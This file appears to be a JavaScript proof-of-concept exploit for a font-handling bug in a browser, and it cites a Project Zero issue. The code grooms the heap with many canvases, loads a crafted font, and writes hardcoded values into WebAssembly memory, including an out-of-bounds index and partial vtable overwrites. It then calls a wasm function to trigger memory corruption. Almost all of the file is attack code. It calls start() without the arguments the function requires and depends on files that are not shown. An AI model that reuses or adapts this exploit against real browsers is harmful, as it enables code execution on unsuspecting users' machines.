// https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=474948
function poc() {
    var ctx = canvas.getContext('2d');
    ctx.font = '24px GeezaPro';
    ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
}

/**
 * Utils
 */
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function () {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function () {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function () {
    float_view[0] = this;
    return int_view[0];
}

function start(wasm_func, memory) {
    // just to fill up holes in the heap, not related to the vuln
    var bobrosses = [];
    for (var i = 0; i < 128; ++i) {
        var canvas = document.createElement('canvas');
        document.body.appendChild(canvas);
        var ctx = canvas.getContext('2d');
        ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
        bobrosses.push(canvas);
    }

    const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)")

    var canvas = document.createElement('canvas')
    canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")
    document.body.appendChild(canvas)

    pocFontFace.load().then(function (pocFontFaceLoaded) {
        document.fonts.add(pocFontFaceLoaded)
        document.fonts.ready.then(function () {
            const GAP = 0x5b0
            const TFONT_VTABLE_OFFSET = 0x160
            const OOB_INDEX = BigInt("0xfffffffffffffdd8").i2f()    // hardcoded by calculating (-0x5b0+0x160)/2

            const array = new Float64Array(memory.buffer, 0, 100)
            array.set([
                BigInt("0").i2f(),
                BigInt("1").i2f(),
                BigInt("2").i2f(),
                BigInt("3").i2f(),
                BigInt("4").i2f(),
                BigInt("5").i2f(),
                BigInt("6").i2f(),
                BigInt("7").i2f(),
                BigInt("8").i2f(),
                BigInt("9").i2f(),
                BigInt("10").i2f(),
                BigInt("11").i2f(),
                BigInt("12").i2f(),
                BigInt("13").i2f(),
                BigInt("14").i2f(),
                BigInt("15").i2f(),
                BigInt("0xfffffffffffffdd8").i2f(),     // location 1
                BigInt("0x00007fff8e200398").i2f(),     // trunglue 1
                BigInt("18").i2f(),                     // location 2
                BigInt("0x00007fff8e200398").i2f(),     // trunglue 2
                BigInt("20").i2f(),     // location 2
                BigInt("21").i2f(),     // trunglue 2
                BigInt("22").i2f(),     // location 3
                BigInt("23").i2f(),     // trunglue 3
                BigInt("24").i2f(),
                BigInt("25").i2f(),
                BigInt("26").i2f(),
                BigInt("27").i2f(),
                BigInt("28").i2f(),
                BigInt("29").i2f(),
                BigInt("30").i2f(),
                BigInt("31").i2f(),
                BigInt("32").i2f(),
                BigInt("33").i2f(),
                BigInt("34").i2f(),
                BigInt("35").i2f(),
                BigInt("36").i2f(),
                BigInt("37").i2f(),
                BigInt("38").i2f(),
                BigInt("39").i2f(),
                BigInt("40").i2f(),
                BigInt("41").i2f(),
                BigInt("42").i2f(),
                BigInt("43").i2f(),
                BigInt("44").i2f(),
                BigInt("45").i2f(),
            ])

            // This is needed! Because somehow `BigInt("0xfffffffffffffdd8").i2f()` results in `0x7ff8000000000000` in memory
            // disable vtable call
            let buffer = new Uint8Array(memory.buffer, 128, 8)   // array[16], location1
            buffer[0] = 0xd0; buffer[1] = 0x00; buffer[2] = 0x00; buffer[3] = 0x00;
            buffer[4] = 0x00; buffer[5] = 0x00; buffer[6] = 0x00; buffer[7] = 0x00;

            // overwrite 2 bytes of vtable address
            buffer = new Uint8Array(memory.buffer, 144, 8)       // array[18], location 2
            buffer[0] = 0xd7;buffer[1] = 0xfd;buffer[2] = 0xff;buffer[3] = 0xff;
            buffer[4] = 0xff;buffer[5] = 0xff;buffer[6] = 0xff;buffer[7] = 0xff;

            // overwrite 2 bytes of vtable address
            buffer = new Uint8Array(memory.buffer, 160, 8)       // array[20], location 3
            buffer[0] = 0xd6;buffer[1] = 0xfd;buffer[2] = 0xff;buffer[3] = 0xff;
            buffer[4] = 0xff;buffer[5] = 0xff;buffer[6] = 0xff;buffer[7] = 0xff;

            // overwrite 2 bytes of vtable address
            buffer = new Uint8Array(memory.buffer, 176, 8)       // array[22], location 4
            buffer[0] = 0xd5;buffer[1] = 0xfd;buffer[2] = 0xff;buffer[3] = 0xff;
            buffer[4] = 0xff;buffer[5] = 0xff;buffer[6] = 0xff;buffer[7] = 0xff;

            // enable vtable call
            buffer = new Uint8Array(memory.buffer, 192, 8)       // array[24], location 5
            buffer[0] = 0xd0; buffer[1] = 0x00; buffer[2] = 0x00; buffer[3] = 0x00;
            buffer[4] = 0x00; buffer[5] = 0x00; buffer[6] = 0x00; buffer[7] = 0x00;

            wasm_func(array.byteOffset)
        })
    })
}

start()